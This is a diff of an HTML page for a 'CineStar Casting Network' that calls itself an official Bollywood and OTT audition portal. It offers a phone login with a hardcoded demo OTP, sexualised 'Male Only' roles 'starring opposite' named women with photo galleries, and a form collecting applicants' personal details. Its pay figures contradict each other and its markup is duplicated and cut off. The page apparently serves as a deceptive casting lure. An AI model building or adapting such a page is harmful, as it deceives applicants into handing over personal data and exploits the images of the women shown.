@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>CineStar Casting Network - Official Auditions</title>
+  <title>CineStar Casting Network - Official</title>
   <style>
     :root {
       --bg-dark: #0f1015;
@@ -17,728 +17,429 @@
       --green: #2ecc71;
     }
 
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
-    body { background-color: var(--bg-dark); color: var(--text-white); display: flex; justify-content: center; min-height: 100vh; }
-    .app-container { width: 100%; max-width: 480px; min-height: 100vh; background-color: var(--bg-dark); position: relative; padding-bottom: 75px; }
-/* Layout Fix & Translate Fix */
-body {
-  top: 0px !important;
-  position: static !important;
-}
-.skiptranslate iframe {
-  display: none !important;
-}
-body > .skiptranslate {
-  display: none !important;
-}
-.app-container {
-  display: block !important;
-  width: 100% !important;
-  max-width: 480px !important;
-  margin: 0 auto !important;
-}
-.screen {
-  display: none !important;
-  width: 100% !important;
-}
-.screen.active {
-  display: block !important;
-  width: 100% !important;
-}
-#screenLobby {
-  width: 100% !important;
-}
-.casting-card {
-  width: 100% !important;
-  display: block !important;
-  margin-bottom: 20px !important;
-  box-sizing: border-box !important;
-}
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+    html, body {
+      background-color: var(--bg-dark);
+      color: var(--text-white);
+      overflow-x: hidden !important;
+      width: 100% !important;
+    }
 
+    .app-container {
+      width: 100% !important;
+      max-width: 480px !important;
+      margin: 0 auto !important;
+      display: block !important;
+      min-height: 100vh;
+      background-color: var(--bg-dark);
+      position: relative;
+    }
 
-    
-    /* Header */
-    .top-header { background: rgba(15, 16, 21, 0.95); backdrop-filter: blur(8px); border-bottom: 1px solid var(--border); padding: 14px 18px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
+    /* Top Header */
+    .top-header {
+      background: rgba(15, 16, 21, 0.95);
+      border-bottom: 1px solid var(--border);
+      padding: 12px 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
     .brand-box { display: flex; align-items: center; gap: 10px; }
-    .brand-logo { width: 34px; height: 34px; background: linear-gradient(135deg, var(--gold), #997a15); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 900; color: #000; font-size: 16px; }
-    .brand-name { font-size: 16px; font-weight: 800; color: #fff; letter-spacing: 0.5px; }
-    .brand-sub { font-size: 10px; color: var(--gold); text-transform: uppercase; letter-spacing: 1.5px; display: block; }
-    .user-pill { background: #202430; border: 1px solid var(--border); padding: 5px 12px; border-radius: 20px; font-size: 12px; color: var(--gold-light); }
+    .brand-logo { width: 34px; height: 34px; background: var(--gold); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #000; font-weight: 900; }
+    .brand-name { font-size: 15px; font-weight: 700; color: #fff; letter-spacing: 0.5px; }
+    .brand-sub { font-size: 10px; color: var(--gold); }
+    .user-pill { background: #202430; border: 1px solid var(--border); border-radius: 20px; padding: 4px 10px; font-size: 11px; color: var(--gold-light); display: flex; align-items: center; gap: 5px; }
 
-    /* Screens */
-    .screen { display: none; padding: 16px; animation: fadeIn 0.25s ease-in-out; }
-    .screen.active { display: block; }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+    /* Screen Management */
+    .screen {
+      display: none !important;
+      width: 100% !important;
+      padding: 16px;
+      box-sizing: border-box !important;
+    }
+    .screen.active {
+      display: block !important;
+      width: 100% !important;
+    }
 
     /* Auth Screen */
-    .auth-card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 16px; padding: 24px; text-align: center; margin-top: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-    .auth-card h2 { font-size: 20px; color: #fff; margin-bottom: 8px; }
-    .auth-card p { font-size: 12px; color: var(--text-muted); margin-bottom: 22px; line-height: 1.5; }
+    .auth-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 24px 18px;
+      margin-top: 15px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+    .auth-card h2 { font-size: 19px; color: #fff; margin-bottom: 6px; font-weight: 700; text-align: center; }
+    .auth-card p { font-size: 12px; color: var(--text-muted); margin-bottom: 20px; text-align: center; line-height: 1.4; }
+
     .input-grp { margin-bottom: 16px; text-align: left; }
-    .input-grp label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 6px; font-weight: 600; }
-    .input-field { width: 100%; padding: 14px; background: #0c0d11; border: 1px solid var(--border); border-radius: 10px; color: #fff; font-size: 15px; outline: none; }
-    .input-field:focus { border-color: var(--gold); }
-    .btn-main { width: 100%; padding: 14px; background: linear-gradient(135deg, var(--gold), #b8911e); border: none; border-radius: 10px; color: #000; font-weight: 800; font-size: 15px; cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px; }
-
-    /* Lobby Movie Cards */
-    .banner-hero { background: linear-gradient(180deg, rgba(229,9,20,0.2) 0%, rgba(24,26,34,0) 100%); border: 1px solid rgba(229,9,20,0.3); border-radius: 14px; padding: 16px; margin-bottom: 20px; text-align: center; }
-    .section-title { font-size: 16px; font-weight: 800; color: #fff; margin: 18px 0 12px; display: flex; align-items: center; justify-content: space-between; }
-    .movie-card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 16px; overflow: hidden; margin-bottom: 18px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
-    .card-img-wrap { width: 100%; height: 240px; position: relative; background: #111; overflow: hidden; }
-    .card-img-wrap img { width: 100%; height: 100%; object-fit: cover; }
-    .card-badge { position: absolute; top: 12px; right: 12px; background: rgba(0,0,0,0.75); backdrop-filter: blur(4px); border: 1px solid var(--gold); color: var(--gold); font-size: 11px; padding: 4px 10px; border-radius: 20px; font-weight: 700; }
-    .card-body { padding: 16px; }
-    .movie-title { font-size: 17px; font-weight: 800; color: #fff; margin-bottom: 4px; }
-    .co-star { font-size: 13px; color: var(--gold-light); margin-bottom: 12px; display: flex; align-items: center; gap: 6px; }
-    .specs-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; background: #0f1015; padding: 10px; border-radius: 10px; margin-bottom: 14px; }
-    .spec-item { font-size: 12px; }
-    .spec-label { color: var(--text-muted); font-size: 10px; text-transform: uppercase; }
-    .spec-val { color: #fff; font-weight: 600; margin-top: 2px; }
-    .pkg-val { color: var(--green); font-weight: 800; }
-
-    /* Bottom Navigation */
-    .bottom-bar { position: fixed; bottom: 0; width: 100%; max-width: 480px; height: 60px; background: rgba(15,16,21,0.98); border-top: 1px solid var(--border); display: flex; justify-content: space-around; align-items: center; z-index: 100; }
-    .b-item { display: flex; flex-direction: column; align-items: center; color: var(--text-muted); font-size: 10px; text-decoration: none; cursor: pointer; gap: 3px; }
-    .b-item.active { color: var(--gold); font-weight: 700; }
-
-    /* Pass Card */
-    .pass-card { background: linear-gradient(145deg, #1d212c, #13151c); border: 2px dashed var(--gold); border-radius: 16px; padding: 20px; margin-top: 15px; }
-    .pass-header { text-align: center; border-bottom: 1px solid var(--border); padding-bottom: 14px; margin-bottom: 14px; }
-        /* Preview Modal Popup */
-    .preview-modal {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
+    .input-grp label { display: block; font-size: 11px; font-weight: 600; color: var(--text-muted); margin-bottom: 6px; letter-spacing: 0.5px; }
+    .input-grp input {
       width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.88);
-      z-index: 9999;
-      justify-content: center;
-      align-items: center;
-      padding: 15px;
-      backdrop-filter: blur(5px);
-    }
-    .preview-content {
-      background: #181a22;
-      border: 1px solid #d4af37;
-      border-radius: 12px;
-      width: 100%;
-      max-width: 420px;
-      padding: 16px;
-      position: relative;
-      text-align: center;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.8);
-    }
-    .preview-close {
-      position: absolute;
-      top: 8px;
-      right: 14px;
+      background: #0f1015;
+      border: 1px solid var(--border);
       color: #fff;
-      font-size: 26px;
-      cursor: pointer;
-    }
-    .preview-video-container video {
-      width: 100%;
+      padding: 12px;
       border-radius: 8px;
-      max-height: 270px;
-      background: #000;
+      font-size: 14px;
+      outline: none;
     }
-    .btn-preview-outline {
-      background: transparent;
-      border: 1px solid #d4af37;
-      color: #d4af37;
-      padding: 9px 14px;
-      border-radius: 6px;
-      font-size: 13px;
+    .input-grp input:focus { border-color: var(--gold); }
+
+    .btn-main {
+      width: 100%;
+      padding: 13px;
+      background: var(--gold);
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 14px;
+      cursor: pointer;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    /* Casting Cards */
+    .casting-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      overflow: hidden;
+      margin-bottom: 20px !important;
+      width: 100% !important;
+      display: block !important;
+      box-sizing: border-box !important;
+    }
+    .card-img-wrap { position: relative; width: 100%; height: 260px; overflow: hidden; background: #000; }
+    .card-img-wrap img { width: 100%; height: 100%; object-fit: cover; }
+    .card-badge {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      background: rgba(0,0,0,0.75);
+      border: 1px solid var(--gold);
+      color: var(--gold);
+      padding: 4px 10px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 600;
+    }
+    .card-body { padding: 14px; }
+    .card-title { font-size: 16px; font-weight: 700; color: #fff; margin-bottom: 4px; }
+    .card-starring { font-size: 12px; color: var(--gold-light); margin-bottom: 12px; }
+
+    .meta-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 8px;
+      background: #12131a;
+      padding: 10px;
+      border-radius: 8px;
+      margin-bottom: 12px;
+      border: 1px solid #222530;
+    }
+    .meta-item { font-size: 11px; }
+    .meta-item span { display: block; color: var(--text-muted); font-size: 10px; margin-bottom: 2px; }
+    .meta-item strong { color: #fff; font-size: 12px; }
+    .pkg-val { color: var(--green) !important; font-weight: 800 !important; }
+
+    .btn-watch {
+      width: 100%;
+      background: #202430;
+      color: var(--gold);
+      border: 1px solid var(--gold);
+      padding: 10px;
+      border-radius: 8px;
+      font-size: 12px;
       font-weight: 600;
       cursor: pointer;
-      width: 100%;
       margin-bottom: 8px;
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 6px;
     }
-/* FORCE MOBILE VERTICAL FIX */
-html, body {
-  overflow-x: hidden !important;
-  width: 100% !important;
-  background-color: var(--bg-dark);
-}
+    .btn-apply {
+      width: 100%;
+      background: var(--gold);
+      color: #000;
+      border: none;
+      padding: 11px;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+      text-transform: uppercase;
+    }
 
-.app-container {
-  display: block !important;
-  width: 100% !important;
-  max-width: 480px !important;
-  margin: 0 auto !important;
-  box-sizing: border-box !important;
-}
-
-/* Hide all inactive screens */
-.screen {
-  display: none !important;
-  width: 100% !important;
-}
-
-/* Only show active screen vertically */
-.screen.active,
-#screenLogin.active,
-#screenLobby.active {
-  display: block !important;
-  width: 100% !important;
-}
-
-#screenLobby, #screenLogin {
-  width: 100% !important;
-}
-
-.casting-card {
-  width: 100% !important;
-  min-width: 100% !important;
-  max-width: 100% !important;
-  display: block !important;
-  margin: 0 0 20px 0 !important;
-  box-sizing: border-box !important;
-}
-
-
+    /* Modal Styling */
+    .preview-modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.85);
+      z-index: 10000;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+    }
+    .preview-content {
+      background: #181a22;
+      border: 1px solid var(--gold);
+      border-radius: 12px;
+      width: 100%;
+      max-width: 440px;
+      padding: 16px;
+      position: relative;
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+    .preview-close {
+      position: absolute;
+      top: 10px;
+      right: 14px;
+      color: #fff;
+      font-size: 26px;
+      font-weight: bold;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
 
 <div class="app-container">
-  
+
   <!-- Header -->
-  <header class="top-header" id="appHeader" style="display:none;">
+  <header class="top-header">
     <div class="brand-box">
-      <div class="brand-logo">C</div>
+      <div class="brand-logo">★</div>
       <div>
-        <span class="brand-name">CINESTAR</span>
-        <span class="brand-sub">CASTING NETWORK</span>
+        <div class="brand-name">CINESTAR</div>
+        <div class="brand-sub">CASTING NETWORK</div>
       </div>
     </div>
-    <div class="user-pill" id="headerPhone">88******12</div>
+    <div class="user-pill">
+      <span>●</span> Active Portal
+    </div>
   </header>
 
- <!-- SCREEN 1: LOGIN -->
-<section class="screen active" id="screenLogin">
-  <div style="text-align:center; padding: 30px 15px 10px;">
-    <div style="width:65px; height:65px; margin:0 auto 12px; background:var(--gold); border-radius:14px; display:flex; align-items:center; justify-content:center; box-shadow:0 8px 20px rgba(212,175,55,0.25);">
-      <span style="font-size:32px;">★</span>
-    </div>
-    <h1 style="font-size:22px; font-weight:800; letter-spacing:1px; margin-bottom:4px;">CINESTAR CASTING</h1>
-    <p style="font-size:12px; color:var(--text-muted);">Official Bollywood & Web Series Audition Portal</p>
-  </div>
-
-  <div class="auth-card">
-    <h2>Artist Portal Login</h2>
-    <p>Enter your 10-digit mobile number to view active casting calls and apply for open roles.</p>
-    
-    <div class="input-grp">
-      <label>MOBILE NUMBER</label>
-      <input type="tel" id="inPhone" placeholder="Enter 10-digit number" maxlength="10">
+  <!-- SCREEN 1: LOGIN -->
+  <section class="screen active" id="screenLogin">
+    <div style="text-align:center; padding: 25px 10px 5px;">
+      <div style="width:60px; height:60px; margin:0 auto 12px; background:var(--gold); border-radius:14px; display:flex; align-items:center; justify-content:center; box-shadow:0 8px 20px rgba(212,175,55,0.25);">
+        <span style="font-size:30px; color:#000;">★</span>
+      </div>
+      <h1 style="font-size:20px; font-weight:800; letter-spacing:1px; margin-bottom:4px;">CINESTAR CASTING</h1>
+      <p style="font-size:12px; color:var(--text-muted);">Official Bollywood & Web Series Audition Portal</p>
     </div>
 
-    <div id="boxOtpSection" style="display:none; margin-top:14px;">
-      <div style="background:#202430; border:1px dashed var(--gold); border-radius:8px; padding:10px; margin-bottom:12px; text-align:center; font-size:12px; color:var(--gold);">
-        Instant Demo OTP: <strong id="dispAutoOtp" style="font-size:16px; letter-spacing:3px;">1234</strong>
-      </div>
-      <div class="input-grp">
-        <label>ENTER 4-DIGIT CODE</label>
-        <input type="number" id="inOtp" placeholder="Enter OTP" maxlength="4">
-      </div>
-    </div>
-
-    <button type="button" class="btn-main" id="btnAuthAction" onclick="handleAuth()" style="margin-top:10px;">SEND CODE</button>
-  </div>
-</section>
-
-<!-- SCREEN 2: LOBBY (CASTING CALLS) -->
-<section class="screen" id="screenLobby">
-
-
-  <!-- SCREEN 2: LOBBY (CASTING CALLS) -->
-
-  <section class="screen" id="screenLobby">
-    <div class="banner-hero">
-      <div style="font-size:11px; color:var(--gold); font-weight:700; text-transform:uppercase;">VIP Artist Enrollment 2026-2027</div>
-      <h3 style="font-size:16px; margin:4px 0;">New Major Film & OTT Castings Open</h3>
-      <p style="font-size:11px; color:var(--text-muted);">Direct shortlisting for freshers & experienced male/female actors.</p>
-    </div>
-
-    <div class="section-title">
-      <span>Active Casting Calls</span>
-      <span style="font-size:11px; color:var(--gold);">5 Live Roles</span>
-    </div>
-
-         <!-- Profile 1: Srimoyee (Corrected Photo) -->
-    <div class="movie-card">
-      <div class="card-img-wrap">
-        <img src="IMG_3930.jpeg" alt="Srimoyee">
-        <div class="card-badge">Lead Role Open</div>
-      </div>
-      <div class="card-body">
-        <div class="movie-title">Project Crimson Desire (OTT Series)</div>
-        <div class="co-star">★ Starring Opposite: <strong>Srimoyee</strong></div>
-        <div class="specs-grid">
-          <div class="spec-item">
-            <div class="spec-label">Location</div>
-            <div class="spec-val">Mumbai & Udaipur</div>
-          </div>
-                    <div class="spec-item">
-            <div class="spec-label">Shoot Duration</div>
-            <div class="spec-val">3 Days</div>
-          </div>
-          <div class="spec-item">
-            <div class="spec-label">Actor Package</div>
-            <div class="spec-val pkg-val">₹45,000</div>
-          </div>
-          <div class="spec-item">
-            <div class="spec-label">Category</div>
-            <div class="spec-val">Male Only</div>
-          </div>
-
-        </div>
-             
-           <button type="button" class="btn-preview-outline" onclick="openMediaPreview('Srimoyee', ['759be8a585da407b84ee20f455b39c79.mp4', '528269e5de944c71858851103ea4a55c.mp4', 'b10919b3b2e6474f88e706c3e1c0a002.mp4', 'fc1a1212333e40fca3b517117202395e.mp4'], ['IMG_3930.jpeg', 'IMG_3931.jpeg', 'IMG_3932.jpeg', 'IMG_3933.jpeg', 'IMG_3934.jpeg', 'IMG_3935.jpeg', 'IMG_3936.jpeg', 'IMG_3937.jpeg'])">
-          🎬 Watch Audition Clip & Photos
-        </button>
-
-        <button class="btn-main" onclick="openApplyForm('Project Crimson Desire', 'Srimoyee', '₹3,50,000')">Apply For Role</button>
-      </div>
-    </div>
-
-
-    <!-- Profile 2: Tejashwini -->
-    <div class="movie-card">
-      <div class="card-img-wrap">
-        <img src="IMG_3901.jpeg" alt="Tejashwini">
-        <div class="card-badge">Auditions Closing Soon</div>
-      </div>
-      <div class="card-body">
-        <div class="movie-title">Midnight Passion (Romantic Thriller)</div>
-        <div class="co-star">★ Starring Opposite: <strong>Tejashwini</strong></div>
-        <div class="specs-grid">
-          <div class="spec-item">
-            <div class="spec-label">Location</div>
-            <div class="spec-val">Goa & Bangalore</div>
-          </div>
-                    <div class="spec-item">
-            <div class="spec-label">Shoot Duration</div>
-            <div class="spec-val">3 Days</div>
-          </div>
-          <div class="spec-item">
-            <div class="spec-label">Actor Package</div>
-            <div class="spec-val pkg-val">₹45,000</div>
-          </div>
-          <div class="spec-item">
-            <div class="spec-label">Category</div>
-            <div class="spec-val">Male Only</div>
-          </div>
-        </div>
-
-        <button type="button" class="btn-preview-outline" onclick="openMediaPreview('Tejashwini', ['79bc879b-8f4d-4d29-8234-fc692350b140.mov'], ['IMG_3901.jpeg', 'IMG_3902.jpeg', 'IMG_3903.jpeg', 'IMG_3904.jpeg', 'IMG_3905.jpeg', 'IMG_3906.jpeg', 'IMG_3907.jpeg', 'IMG_3908.jpeg', 'IMG_3909.jpeg', 'IMG_3910.jpeg', 'IMG_3911.jpeg', 'IMG_3912.jpeg', 'IMG_3913.jpeg', 'IMG_3914.jpeg', 'IMG_3916.jpeg', 'IMG_3917.jpeg', 'IMG_3918.jpeg', 'IMG_3919.jpeg', 'IMG_3920.jpeg', 'IMG_3921.jpeg', 'IMG_3922.jpeg', 'IMG_3923.jpeg', 'IMG_3924.jpeg'])">
-          🎬 Watch Audition Clip & Photos
-        </button>
-        <button class="btn-main" onclick="openApplyForm('Midnight Passion', 'Tejashwini')">APPLY FOR ROLE</button>
-
-        </div>
-            <button type="button" class="btn-preview-outline" onclick="openMediaPreview('Tejashwini', 'video2.mp4')">
-          🎬 Watch Audition Clip & Preview
-        </button>
-
-                <button type="button" class="btn-preview-outline" onclick="openMediaPreview('Tejashwini', ['79bc879b-8f4d-4d29-8234-58a4369e59d9.mp4'], ['IMG_3901.jpeg', 'IMG_3902.jpeg', 'IMG_3903.jpeg', 'IMG_3904.jpeg', 'IMG_3905.jpeg', 'IMG_3906.jpeg', 'IMG_3907.jpeg', 'IMG_3908.jpeg', 'IMG_3909.jpeg', 'IMG_3910.jpeg', 'IMG_3911.jpeg', 'IMG_3912.jpeg', 'IMG_3913.jpeg', 'IMG_3914.jpeg', 'IMG_3916.jpeg', 'IMG_3917.jpeg', 'IMG_3918.jpeg', 'IMG_3919.jpeg', 'IMG_3920.jpeg', 'IMG_3921.jpeg', 'IMG_3922.jpeg', 'IMG_3923.jpeg', 'IMG_3924.jpeg'])">
-          🎬 Watch Audition Clip & Photos
-        </button>    
-
-        <button class="btn-main" onclick="openApplyForm('Midnight Passion', 'Tejashwini', '₹2,80,000')">Apply For Role</button>
-      </div>
-    </div>
-
-        <!-- Profile 3: Tina Nandy (Corrected Photo) -->
-    <div class="movie-card">
-      <div class="card-img-wrap">
-        <img src="IMG_3874.jpeg" alt="Tina Nandy">
-        <div class="card-badge">VIP Casting</div>
-      </div>
-      <div class="card-body">
-        <div class="movie-title">Velvet Secrets (Bold Drama)</div>
-        <div class="co-star">★ Starring Opposite: <strong>Tina Nandy</strong></div>
-        <div class="specs-grid">
-          <div class="spec-item">
-            <div class="spec-label">Location</div>
-            <div class="spec-val">Manali & Shimla</div>
-          </div>
-                  <div class="spec-item">
-            <div class="spec-label">Shoot Duration</div>
-            <div class="spec-val">3 Days</div>
-          </div>
-          <div class="spec-item">
-            <div class="spec-label">Actor Package</div>
-            <div class="spec-val pkg-val">₹45,000</div>
-          </div>
-          <div class="spec-item">
-            <div class="spec-label">Category</div>
-            <div class="spec-val">Male Only</div>
-          </div>
-
-        </div>
-                <button type="button" class="btn-preview-outline" onclick="openMediaPreview('Tina Nandy', 'video3.mp4')">
-          🎬 Watch Audition Clip & Preview
-        </button>
-
-                <button type="button" class="btn-preview-outline" onclick="openMediaPreview('Tina Nandy', ['0ed270b3-223d-4fc3-855b-f574fa63ba32.mov', '19235ad0-b949-45ef-b78c-3d9e32ba6ba6.mov'], ['IMG_3854.jpeg', 'IMG_3855.jpeg', 'IMG_3856.jpeg', 'IMG_3857.jpeg', 'IMG_3858.jpeg', 'IMG_3859.jpeg', 'IMG_3861.jpeg', 'IMG_3862.jpeg', 'IMG_3863.jpeg', 'IMG_3865.jpeg', 'IMG_3866.jpeg', 'IMG_3867.jpeg', 'IMG_3868.jpeg', 'IMG_3869.jpeg', 'IMG_3870.jpeg', 'IMG_3871.jpeg', 'IMG_3872.jpeg', 'IMG_3873.jpeg', 'IMG_3874.jpeg', 'IMG_3875.jpeg', 'IMG_3877.jpeg', 'IMG_3878.jpeg', 'IMG_3879.jpeg', 'IMG_3881.jpeg', 'IMG_3882.jpeg', 'IMG_3883.jpeg', 'IMG_3884.jpeg', 'IMG_3886.jpeg', 'IMG_3887.jpeg', 'IMG_3888.jpeg', 'IMG_3889.jpeg', 'IMG_3890.jpeg', 'IMG_3891.jpeg', 'IMG_3892.jpeg', 'IMG_3893.jpeg', 'IMG_3894.jpeg', 'IMG_3895.jpeg', 'IMG_3896.jpeg', 'IMG_3897.jpeg', 'IMG_3898.jpeg', 'IMG_3899.jpeg', 'IMG_3900.jpeg'])">
-          🎬 Watch Audition Clip & Photos
-        </button>
-
-        <button class="btn-main" onclick="openApplyForm('Velvet Secrets', 'Tina Nandy', '₹3,20,000')">Apply For Role</button>
-      </div>
-    </div>
-
-
-    <!-- Profile 4: Anjali -->
-    <div class="movie-card">
-      <div class="card-img-wrap">
-        <img src="IMG_3967.jpeg" alt="Anjali">
-        <div class="card-badge">New Shoot</div>
-      </div>
-      <div class="card-body">
-        <div class="movie-title">Urban Seduction (OTT Web Film)</div>
-        <div class="co-star">★ Starring Opposite: <strong>Anjali</strong></div>
-        <div class="specs-grid">
-          <div class="spec-item">
-            <div class="spec-label">Location</div>
-            <div class="spec-val">Delhi NCR & Jaipur</div>
-          </div>
-          <div class="spec-item">
-            <div class="spec-label">Shoot Duration</div>
-            <div class="spec-val">15 Days Schedule</div>
-          </div>
-                   <div class="spec-item">
-            <div class="spec-label">Shoot Duration</div>
-            <div class="spec-val">2 Days</div>
-          </div>
-          <div class="spec-item">
-            <div class="spec-label">Actor Package</div>
-            <div class="spec-val pkg-val">₹30,000</div>
-          </div>
-          <div class="spec-item">
-            <div class="spec-label">Category</div>
-            <div class="spec-val">Male Only</div>
-          </div>
-        </div>
-
-        <button type="button" class="btn-preview-outline" onclick="openMediaPreview('Anjali', [], ['IMG_3938.jpeg', 'IMG_3939.jpeg', 'IMG_3940.jpeg', 'IMG_3941.jpeg', 'IMG_3942.jpeg', 'IMG_3943.jpeg', 'IMG_3944.jpeg', 'IMG_3945.jpeg', 'IMG_3946.jpeg', 'IMG_3947.jpeg', 'IMG_3948.jpeg', 'IMG_3949.jpeg', 'IMG_3950.jpeg', 'IMG_3951.jpeg', 'IMG_3952.jpeg', 'IMG_3953.jpeg', 'IMG_3954.jpeg', 'IMG_3955.jpeg', 'IMG_3956.jpeg', 'IMG_3957.jpeg', 'IMG_3958.jpeg', 'IMG_3959.jpeg', 'IMG_3960.jpeg', 'IMG_3961.jpeg', 'IMG_3962.jpeg', 'IMG_3963.jpeg', 'IMG_3964.jpeg', 'IMG_3965.jpeg', 'IMG_3966.jpeg', 'IMG_3967.jpeg', 'IMG_3968.jpeg', 'IMG_3969.jpeg', 'IMG_3970.jpeg', 'IMG_3971.jpeg', 'IMG_3972.jpeg', 'IMG_3973.jpeg', 'IMG_3974.jpeg', 'IMG_3975.jpeg', 'IMG_3976.jpeg', 'IMG_3977.jpeg', 'IMG_3978.jpeg'])">
-          📸 View Portfolio Photos
-        </button>
-        <button class="btn-main" onclick="openApplyForm('Urban Seduction', 'Anjali')">APPLY FOR ROLE</button>
-
-        </div>
-                <button type="button" class="btn-preview-outline" onclick="openMediaPreview('Anjali', 'video4.mp4')">
-          🎬 Watch Audition Clip & Preview
-        </button>
-        
-        <button type="button" class="btn-preview-outline" onclick="openMediaPreview('Anjali', [], ['IMG_3938.jpeg', 'IMG_3939.jpeg', 'IMG_3940.jpeg', 'IMG_3941.jpeg', 'IMG_3942.jpeg', 'IMG_3943.jpeg', 'IMG_3944.jpeg', 'IMG_3945.jpeg', 'IMG_3946.jpeg', 'IMG_3947.jpeg', 'IMG_3948.jpeg', 'IMG_3949.jpeg', 'IMG_3950.jpeg', 'IMG_3951.jpeg', 'IMG_3952.jpeg', 'IMG_3953.jpeg', 'IMG_3954.jpeg', 'IMG_3955.jpeg', 'IMG_3956.jpeg', 'IMG_3957.jpeg', 'IMG_3958.jpeg', 'IMG_3959.jpeg', 'IMG_3960.jpeg', 'IMG_3961.jpeg', 'IMG_3962.jpeg', 'IMG_3963.jpeg', 'IMG_3964.jpeg', 'IMG_3965.jpeg', 'IMG_3966.jpeg', 'IMG_3967.jpeg', 'IMG_3968.jpeg', 'IMG_3969.jpeg', 'IMG_3970.jpeg', 'IMG_3971.jpeg', 'IMG_3972.jpeg', 'IMG_3973.jpeg', 'IMG_3974.jpeg', 'IMG_3975.jpeg', 'IMG_3976.jpeg', 'IMG_3977.jpeg', 'IMG_3978.jpeg'])">
-          📸 View Portfolio Photos
-        </button>
-
-        <button class="btn-main" onclick="openApplyForm('Urban Seduction', 'Anjali', '₹3,00,000')">Apply For Role</button>
-      </div>
-    </div>
-
-    <!-- Profile 5: VIP Special -->
-    <div class="movie-card">
-      <div class="card-img-wrap">
-        <img src="IMG_3979.jpeg" alt="VIP Project">
-        <div class="card-badge">Mega Budget</div>
-      </div>
-      <div class="card-body">
-        <div class="movie-title">Golden Mirage (High Budget Feature)</div>
-        <div class="co-star">★ Starring Opposite: <strong>Featured Star</strong></div>
-        <div class="specs-grid">
-          <div class="spec-item">
-            <div class="spec-label">Location</div>
-            <div class="spec-val">Mumbai Film City</div>
-          </div>
-          <div class="spec-item">
-            <div class="spec-label">Shoot Duration</div>
-            <div class="spec-val">20 Days Schedule</div>
-          </div>
-          <div class="spec-item">
-            <div class="spec-label">Actor Package</div>
-            <div class="spec-val pkg-val">₹4,20,000</div>
-          </div>
-          <div class="spec-item">
-            <div class="spec-label">Category</div>
-            <div class="spec-val">Key Character</div>
-          </div>
-        </div>
-                <button type="button" class="btn-preview-outline" onclick="openMediaPreview('Featured Star', 'video5.mp4')">
-          🎬 Watch Audition Clip & Preview
-        </button>
-
-        <button class="btn-main" onclick="openApplyForm('Golden Mirage', 'Featured Star', '₹4,20,000')">Apply For Role</button>
-      </div>
-    </div>
-
-  </section>
-
-
-  <!-- SCREEN 3: REGISTRATION / APPLICATION FORM -->
-  <section class="screen" id="screenApply">
-    <div style="background:#202430; border:1px solid var(--border); border-radius:12px; padding:14px; margin-bottom:16px;">
-      <div style="font-size:11px; color:var(--gold); text-transform:uppercase;">Applying for Movie Role:</div>
-      <div id="applyTargetTitle" style="font-size:16px; font-weight:800; margin:2px 0 4px;">Movie Title</div>
-      <div id="applyTargetMeta" style="font-size:12px; color:var(--text-muted);">Opposite: Tara Sutaria | Package: ₹2,80,000</div>
-    </div>
-
-    <div class="auth-card" style="margin-top:0; text-align:left;">
-      <h3 style="font-size:16px; margin-bottom:14px; color:#fff;">Actor Registration Details</h3>
+    <div class="auth-card">
+      <h2>Artist Portal Login</h2>
+      <p>Enter your 10-digit mobile number to view active casting calls and apply for open roles.</p>
       
       <div class="input-grp">
-        <label>FULL LEGAL NAME *</label>
-        <input type="text" id="regName" class="input-field" placeholder="Enter your full name">
+        <label>MOBILE NUMBER</label>
+        <input type="tel" id="inPhone" placeholder="Enter 10-digit number" maxlength="10">
       </div>
 
-      <div class="input-grp">
-        <label>CONTACT NUMBER *</label>
-        <input type="tel" id="regPhone" class="input-field" readonly>
-      </div>
-
-      <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
-        <div class="input-grp">
-          <label>AGE *</label>
-          <input type="number" id="regAge" class="input-field" placeholder="e.g. 24">
+      <div id="boxOtpSection" style="display:none; margin-top:14px;">
+        <div style="background:#202430; border:1px dashed var(--gold); border-radius:8px; padding:10px; margin-bottom:12px; text-align:center; font-size:12px; color:var(--gold);">
+          Instant Demo OTP: <strong id="dispAutoOtp" style="font-size:16px; letter-spacing:3px;">1234</strong>
         </div>
         <div class="input-grp">
-          <label>GENDER *</label>
-          <select id="regGender" class="input-field" style="background:#0c0d11; color:#fff;">
